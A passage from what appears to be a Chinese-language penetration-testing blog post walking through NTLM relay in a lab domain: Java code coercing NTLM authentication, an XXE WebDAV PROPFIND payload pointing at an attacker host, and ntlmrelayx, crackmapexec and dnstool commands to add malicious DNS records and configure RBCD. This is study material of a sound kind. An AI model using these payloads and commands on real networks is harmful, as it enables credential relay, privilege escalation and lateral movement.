+<span class="line"><span style="--shiki-light:#D32F2F;--shiki-dark:#C792EA">import</span><span style="--shiki-light:#D32F2F;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic"> java</span><span style="--shiki-light:#212121;--shiki-dark:#C792EA">.</span><span style="--shiki-light:#D32F2F;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">util</span><span style="--shiki-light:#212121;--shiki-dark:#C792EA">.</span><span style="--shiki-light:#D32F2F;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">Scanner</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#D32F2F;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">public</span><span style="--shiki-light:#D32F2F;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic"> class</span><span style="--shiki-light:#6F42C1;--shiki-dark:#FFCB8B"> Main</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB"> {</span></span>
+<span class="line"><span style="--shiki-light:#D32F2F;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">    public</span><span style="--shiki-light:#D32F2F;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic"> static</span><span style="--shiki-light:#D32F2F;--shiki-dark:#C792EA"> void</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic"> main</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D9F5DD">(</span><span style="--shiki-light:#D32F2F;--shiki-dark:#C792EA">String</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">[] </span><span style="--shiki-light:#24292EFF;--shiki-dark:#D7DBE0">args</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D9F5DD">)</span><span style="--shiki-light:#D32F2F;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic"> throws</span><span style="--shiki-light:#D32F2F;--shiki-dark:#C792EA"> Exception</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">{</span></span>
+<span class="line"><span style="--shiki-light:#D32F2F;--shiki-dark:#C792EA">        URL</span><span style="--shiki-light:#24292EFF;--shiki-dark:#C5E478"> url</span><span style="--shiki-light:#D32F2F;--shiki-dark:#C792EA"> =</span><span style="--shiki-light:#D32F2F;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic"> new</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic"> URL</span><span style="--shiki-light:#6F42C1;--shiki-dark:#D9F5DD">(</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">http://192.168.30.40:8000/</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#6F42C1;--shiki-dark:#D9F5DD">)</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="--shiki-light:#D32F2F;--shiki-dark:#C792EA">        HttpURLConnection</span><span style="--shiki-light:#24292EFF;--shiki-dark:#C5E478"> conn</span><span style="--shiki-light:#D32F2F;--shiki-dark:#C792EA"> =</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB"> (HttpURLConnection) </span><span style="--shiki-light:#1976D2;--shiki-dark:#C5E478">url</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">openConnection</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D9F5DD">()</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="--shiki-light:#1976D2;--shiki-dark:#C5E478">        conn</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">setRequestMethod</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D9F5DD">(</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">GET</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D9F5DD">)</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="--shiki-light:#1976D2;--shiki-dark:#C5E478">        conn</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">connect</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D9F5DD">()</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="--shiki-light:#D32F2F;--shiki-dark:#C792EA">        Scanner</span><span style="--shiki-light:#24292EFF;--shiki-dark:#C5E478"> s</span><span style="--shiki-light:#D32F2F;--shiki-dark:#C792EA"> =</span><span style="--shiki-light:#D32F2F;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic"> new</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic"> Scanner</span><span style="--shiki-light:#6F42C1;--shiki-dark:#D9F5DD">(</span><span style="--shiki-light:#1976D2;--shiki-dark:#C5E478">conn</span><span style="--shiki-light:#212121;--shiki-dark:#82AAFF">.</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">getInputStream</span><span style="--shiki-light:#6F42C1;--shiki-dark:#D9F5DD">())</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">useDelimiter</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D9F5DD">(</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#22863A;--shiki-dark:#F78C6C">\\</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">A</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D9F5DD">)</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="--shiki-light:#D32F2F;--shiki-dark:#C792EA">        String</span><span style="--shiki-light:#24292EFF;--shiki-dark:#C5E478"> result</span><span style="--shiki-light:#D32F2F;--shiki-dark:#C792EA"> =</span><span style="--shiki-light:#1976D2;--shiki-dark:#C5E478"> s</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">hasNext</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D9F5DD">()</span><span style="--shiki-light:#D32F2F;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">?</span><span style="--shiki-light:#1976D2;--shiki-dark:#C5E478"> s</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">next</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D9F5DD">()</span><span style="--shiki-light:#D32F2F;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic"> :</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD"> ""</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="--shiki-light:#1976D2;--shiki-dark:#C5E478">        System</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#1976D2;--shiki-light-font-style:inherit;--shiki-dark:#FAF39F;--shiki-dark-font-style:italic">out</span><span style="--shiki-light:#212121;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">println</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D9F5DD">(</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">result</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D9F5DD">)</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">;</span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">    }</span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">}</span></span></code></pre>
+<p>首先判断返回头 <code>WWW-Authenticate</code> 的值是否为 <code>NTLM</code></p>
+<p><img src="https://img.exp10it.io/img/202308011950125.png" alt="image-20230801195014052"></p>
+<p>之后一路跟进, 来到 <code>getServerAuthentication</code> 方法</p>
+<p><img src="https://img.exp10it.io/img/202308011953009.png" alt="image-20230801195345942"></p>
+<p>调用 <code>sun.net.www.protocol.http.NTLMAuthenticationProxy#isTrustedSite</code> 方法判断是否是受信任的网站</p>
+<p><img src="https://img.exp10it.io/img/202308011954859.png" alt="image-20230801195413788"></p>
+<p>NTLMAuthenticationProxy 通过反射调用 NTLMAuthentication 的 isTrustedSite 方法</p>
+<p><img src="https://img.exp10it.io/img/202308011955610.png" alt="image-20230801195514538"></p>
+<p>调用 <code>sun.net.www.protocol.http.ntlm.NTLMAuthenticationCallback.DefaultNTLMAuthenticationCallback#isTrustedSite</code></p>
+<p><img src="https://img.exp10it.io/img/202308011955923.png" alt="image-20230801195525846"></p>
+<p>默认为 true, 没有经过任何限制</p>
+<p>web 服务接收到的两次 http 请求</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>GET / HTTP/1.1</span></span>
+<span class="line"><span>User-Agent: Java/1.8.0_40</span></span>
+<span class="line"><span>Host: 192.168.30.40:8000</span></span>
+<span class="line"><span>Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2</span></span>
+<span class="line"><span>Connection: keep-alive</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>GET / HTTP/1.1</span></span>
+<span class="line"><span>User-Agent: Java/1.8.0_40</span></span>
+<span class="line"><span>Host: 192.168.30.40:8000</span></span>
+<span class="line"><span>Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2</span></span>
+<span class="line"><span>Connection: keep-alive</span></span>
+<span class="line"><span>Authorization: NTLM TlRMTVNTUAABAAAAB7IIogkACQAzAAAACwALACgAAAAKAGFKAAAAD01JTkktU0VSVkVSV09SS0dST1VQ</span></span>
+<span class="line"><span></span></span></code></pre>
+<p>而在高版本的 JDK 中, NTLMAuthentication 类加入了 AuthMode 字段</p>
+<p><img src="https://img.exp10it.io/img/202308011959952.png" alt="image-20230801195950854"></p>
+<p><img src="https://img.exp10it.io/img/202308012000799.png" alt="image-20230801200042689"></p>
+<p>默认为 <code>DISABLED</code>, 因此无法自动以当前用户的身份发起 NTLM 认证请求</p>
+<p>下面尝试在 JDK 1.5 + Tomcat 5 WebDAV 环境下复现从 XXE 到 NTLM Relay 的过程</p>
+<p>注意 Tomcat 必须要以 SYSTEM 权限启动, 因为 SYSTEM 出网时使用的是当前机器的机器账户, 能够为自身配置 RBCD</p>
+<p>然后在 SYSTEM 的 context 中要手动配置 <code>JAVA_HOME</code> 环境变量</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">SET</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> JAVA_HOME=C:</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\J</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">ava</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\j</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">dk1.5.0_22</span></span></code></pre>
+<p><img src="https://img.exp10it.io/img/202308012003009.png" alt="image-20230801200325895"></p>
+<p>启动 ntlmrealyx</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">ntlmrelayx.py</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -t</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> ldap://192.168.30.10</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> --delegate-access</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> --escalate-user</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD"> '</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">TEST$</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span></span></code></pre>
+<p>payload</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="http"><code><span class="line"><span style="--shiki-light:#D32F2F;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">PROPFIND</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB"> /webdav/ </span><span style="--shiki-light:#D32F2F;--shiki-dark:#C792EA">HTTP</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">/</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">1.1</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#CAECE6">Host</span><span style="--shiki-light:#D32F2F;--shiki-dark:#C792EA">:</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> 192.168.30.20:8080</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#CAECE6">Connection</span><span style="--shiki-light:#D32F2F;--shiki-dark:#C792EA">:</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> close</span></span>
+<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#CAECE6">Content-Length</span><span style="--shiki-light:#D32F2F;--shiki-dark:#C792EA">:</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> 249</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#7FDBCA">&#x3C;?</span><span style="--shiki-light:#22863A;--shiki-dark:#CAECE6">xml</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#C5E478;--shiki-dark-font-style:italic"> version</span><span style="--shiki-light:#24292EFF;--shiki-dark:#7FDBCA">=</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">1.0</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#C5E478;--shiki-dark-font-style:italic"> encoding</span><span style="--shiki-light:#24292EFF;--shiki-dark:#7FDBCA">=</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">UTF-8</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#24292EFF;--shiki-dark:#7FDBCA">?></span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#7FDBCA">&#x3C;!</span><span style="--shiki-light:#D32F2F;--shiki-dark:#C792EA">DOCTYPE</span><span style="--shiki-light:#24292EFF;--shiki-light-font-style:inherit;--shiki-dark:#7FDBCA;--shiki-dark-font-style:italic"> propertyupdate</span><span style="--shiki-light:#24292EFF;--shiki-dark:#82AAFF"> [</span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#7FDBCA">&#x3C;!</span><span style="--shiki-light:#D32F2F;--shiki-dark:#C792EA">ENTITY</span><span style="--shiki-light:#24292EFF;--shiki-light-font-style:inherit;--shiki-dark:#7FDBCA;--shiki-dark-font-style:italic"> loot</span><span style="--shiki-light:#D32F2F;--shiki-dark:#C792EA"> SYSTEM </span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">http://192.168.30.40/</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#24292EFF;--shiki-dark:#7FDBCA">></span><span style="--shiki-light:#24292EFF;--shiki-dark:#82AAFF"> ]</span><span style="--shiki-light:#24292EFF;--shiki-dark:#7FDBCA">></span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#7FDBCA">&#x3C;</span><span style="--shiki-light:#22863A;--shiki-dark:#CAECE6">D</span><span style="--shiki-light:#212121;--shiki-dark:#CAECE6">:</span><span style="--shiki-light:#22863A;--shiki-dark:#CAECE6">propertyupdate</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#C5E478;--shiki-dark-font-style:italic">    xmlns</span><span style="--shiki-light:#212121;--shiki-dark:#C5E478">:</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#C5E478;--shiki-dark-font-style:italic">D</span><span style="--shiki-light:#24292EFF;--shiki-dark:#7FDBCA">=</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">DAV:</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#24292EFF;--shiki-dark:#7FDBCA">></span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#7FDBCA">    &#x3C;</span><span style="--shiki-light:#22863A;--shiki-dark:#CAECE6">D</span><span style="--shiki-light:#212121;--shiki-dark:#CAECE6">:</span><span style="--shiki-light:#22863A;--shiki-dark:#CAECE6">set</span><span style="--shiki-light:#24292EFF;--shiki-dark:#7FDBCA">></span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#7FDBCA">        &#x3C;</span><span style="--shiki-light:#22863A;--shiki-dark:#CAECE6">D</span><span style="--shiki-light:#212121;--shiki-dark:#CAECE6">:</span><span style="--shiki-light:#22863A;--shiki-dark:#CAECE6">prop</span><span style="--shiki-light:#24292EFF;--shiki-dark:#7FDBCA">></span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#7FDBCA">            &#x3C;</span><span style="--shiki-light:#22863A;--shiki-dark:#CAECE6">a</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#C5E478;--shiki-dark-font-style:italic">                xmlns</span><span style="--shiki-light:#24292EFF;--shiki-dark:#7FDBCA">=</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">http://192.168.30.40/</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#24292EFF;--shiki-dark:#7FDBCA">></span><span style="--shiki-light:#24292EFF;--shiki-dark:#82AAFF">&#x26;loot;</span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#7FDBCA">            &#x3C;/</span><span style="--shiki-light:#22863A;--shiki-dark:#CAECE6">a</span><span style="--shiki-light:#24292EFF;--shiki-dark:#7FDBCA">></span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#7FDBCA">        &#x3C;/</span><span style="--shiki-light:#22863A;--shiki-dark:#CAECE6">D</span><span style="--shiki-light:#212121;--shiki-dark:#CAECE6">:</span><span style="--shiki-light:#22863A;--shiki-dark:#CAECE6">prop</span><span style="--shiki-light:#24292EFF;--shiki-dark:#7FDBCA">></span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#7FDBCA">    &#x3C;/</span><span style="--shiki-light:#22863A;--shiki-dark:#CAECE6">D</span><span style="--shiki-light:#212121;--shiki-dark:#CAECE6">:</span><span style="--shiki-light:#22863A;--shiki-dark:#CAECE6">set</span><span style="--shiki-light:#24292EFF;--shiki-dark:#7FDBCA">></span></span>
+<span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#7FDBCA">&#x3C;/</span><span style="--shiki-light:#22863A;--shiki-dark:#CAECE6">D</span><span style="--shiki-light:#212121;--shiki-dark:#CAECE6">:</span><span style="--shiki-light:#22863A;--shiki-dark:#CAECE6">propertyupdate</span><span style="--shiki-light:#24292EFF;--shiki-dark:#7FDBCA">></span></span></code></pre>
+<p><img src="https://img.exp10it.io/img/202308011726216.png" alt="image-20230801172615159"></p>
+<p><img src="https://img.exp10it.io/img/202308011726071.png" alt="image-20230801172627011"></p>
+<h3 id="webdav">WebDAV</h3>
+<p>参考文章: <a href="https://whoamianony.top/posts/privilege-escalation-ntlmrelay2self-over-http-webdav/">https://whoamianony.top/posts/privilege-escalation-ntlmrelay2self-over-http-webdav/</a></p>
+<p>Windows 使用 WebClient 服务实现 WebDAV, 请求的 UNC 路径格式为 <code>\\evilhost@80\webdav\</code></p>
+<p>WebClient 在 Workstation 系统中是默认启用的, 但需要手动启动服务, 而 Server 系统需要通过附加功能来安装并启用 WebDAV 组件</p>
+<p>原理:</p>
+<ol>
+<li>客户端发出一个 OPTIONS 方法来发现服务器支持的请求方法</li>
+<li>如果支持 PROPFIND 方法, 则发出 PROPFIND 请求来发现目录结构</li>
+<li>如果服务器以 401 Unauthorized 响应并通过 WWW-Authenticate 标头请求 NTLM 身份验证, 则 WebDAV 将继续启动 NTLM 质询响应身份验证, 最终将 Net-NTLM Hash 提供给服务器</li>
+</ol>
+<p>默认情况下, WebClient 仅对本地内部网 (Local Intranet) 或受信任的站点 (Trusted Sites) 列表中的目标自动使用当前用户凭据进行 NTLM 认证</p>
+<p>因此需要以任意域用户的权限在内网 DNS 上添加一条恶意的 A 记录, 然后通过强制认证配合 NTLM Relay to LDAP 配置 RBCD 实现横向移动</p>
+<p>利用过程如下</p>
+<p>先在机器上手动启动 WebClient 服务</p>
+<p><img src="https://img.exp10it.io/img/202308012012173.png" alt="image-20230801201223043"></p>
+<p>服务发现</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">crackmapexec</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> smb</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> 192.168.30.0/24</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -u</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> Alice</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -p</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD"> '</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Alice123!</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -d</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> hack-my.com</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF">  -M</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> webdav</span></span></code></pre>
+<p><img src="https://img.exp10it.io/img/202308012013981.png" alt="image-20230801201316851"></p>
+<p>添加 DNS 记录, 使其指向攻击者的主机</p>
+<p><a href="https://github.com/dirkjanm/krbrelayx">https://github.com/dirkjanm/krbrelayx</a></p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">python3</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> dnstool.py</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -u</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> hack-my.com</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\\</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">Alice</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -p</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD"> '</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Alice123!</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -r</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> evil.hack-my.com</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -d</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 192.168.30.40</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -a</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> add</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> DC.hack-my.com</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">python3</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> dnstool.py</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -u</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> hack-my.com</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\\</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">Alice</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -p</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD"> '</span><span style="--shiki-light:#22863A;--shiki-dark:#ECC48D">Alice123!</span><span style="--shiki-light:#22863A;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -r</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> evil.hack-my.com</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -a</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> query</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> DC.hack-my.com</span></span></code></pre>
+<p><img src="https://img.exp10it.io/img/202308012016337.png" alt="image-20230801201614205"></p>
+<p>NTLM Relay + PetitPotam</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">ntlmrelayx.py</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> -t</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> ldap://192.168.30.10</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> --escalate-user</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> TEST</span><span style="--shiki-light:#24292EFF;--shiki-dark:#F78C6C">\$</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> --delegate-access</span><span style="--shiki-light:#2B5581;--shiki-dark:#82AAFF"> --no-dump</span></span>
+<span class="line"></span>
